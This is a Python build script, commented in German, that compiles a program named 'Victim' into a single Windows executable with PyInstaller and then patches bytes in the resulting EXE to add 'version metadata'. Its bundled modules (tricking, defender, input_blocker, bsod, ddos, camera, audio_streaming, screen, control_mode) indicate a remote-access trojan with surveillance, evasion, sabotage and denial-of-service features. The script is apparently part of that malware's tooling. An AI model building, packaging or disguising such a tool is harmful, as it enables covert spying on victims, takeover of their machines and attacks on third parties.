#!/usr/bin/env python3
import shutil
import os

# Buildet PyInstaller und fügt dann Versionsinformationen ein
BUILD_DIST = r'E:\XVictim\Victim\dist'
BUILD_WORK = r'E:\XVictim\Victim\build'

os.makedirs(BUILD_DIST, exist_ok=True)
os.makedirs(BUILD_WORK, exist_ok=True)

os.system(r'cd C:\Users\gabri\Downloads\XVictim\Victim && pyinstaller --onefile --collect-all zmq --collect-all requests --collect-all pyautogui -p "." --distpath "' + BUILD_DIST + '" --workpath "' + BUILD_WORK + '" --hidden-import=tricking --hidden-import=defender --hidden-import=metadata_provider --hidden-import=config --hidden-import=network --hidden-import=command --hidden-import=screen --hidden-import=sysinfo --hidden-import=tempsaver --hidden-import=virtual --hidden-import=mousemover --hidden-import=audio --hidden-import=camera --hidden-import=audio_streaming --hidden-import=audio_diagnostics --hidden-import=bsod --hidden-import=control_mode --hidden-import=ddos --hidden-import=file_copy --hidden-import=file_handler --hidden-import=input_blocker --hidden-import=utils main.py')

# Jetzt Metadaten hinzufügen
try:
    import pefile
    from pathlib import Path
    
    exe_path = os.path.join(BUILD_DIST, 'main.exe')
    
    if os.path.exists(exe_path):
        pe = pefile.PE(exe_path)
        
        # Setze Versionsinformationen
        pe.set_bytes_at_offset(0x40, b'\x01\x00\x00\x00')  # FileVersion High
        
        print("[+] Versionsinformationen gesetzt")
        pe.write(exe_path)
        print("[+] EXE aktualisiert")
    else:
        print("[-] EXE nicht gefunden")
except ImportError:
    print("[!] pefile nicht installiert, überspringe Metadaten")
except Exception as e:
    print(f"[!] Fehler beim Setzen der Metadaten: {e}")
